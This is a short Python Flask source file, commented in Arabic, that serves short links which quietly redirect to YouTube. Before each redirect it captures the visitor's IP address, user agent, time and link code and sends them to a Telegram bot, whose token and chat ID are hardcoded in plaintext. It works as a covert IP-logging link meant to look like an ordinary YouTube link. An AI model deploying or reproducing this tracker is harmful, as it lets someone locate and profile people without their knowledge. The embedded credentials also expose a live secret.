
from flask import Flask, redirect, request
import requests
from datetime import datetime

app = Flask(__name__)

# إعدادات التحويل
TARGET_URL = "https://m.youtube.com/?feature=youtu.be"

# إعدادات تيليجرام
TELEGRAM_TOKEN = "7968377745:AAGKdDg4DmQ3wUnCwc3PPAsCmVxSwOrVtqo"
TELEGRAM_CHAT_ID = "5992157066"

@app.route('/r/<code>')
def redirect_link(code):
    # تسجيل الدخول
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    now = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

    # رسالة الإشعار
    message = f"🚨 شخص دخل الرابط المختصر\n\n" \
              f"🕐 الوقت: {now} (UTC)\n" \
              f"🌐 IP: {user_ip}\n" \
              f"📱 الجهاز: {user_agent}\n" \
              f"🔑 الكود: {code}"

    # إرسال إلى تيليجرام
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    requests.post(telegram_url, data={
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    })

    # إعادة توجيه إلى الرابط الأساسي
    return redirect(TARGET_URL)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
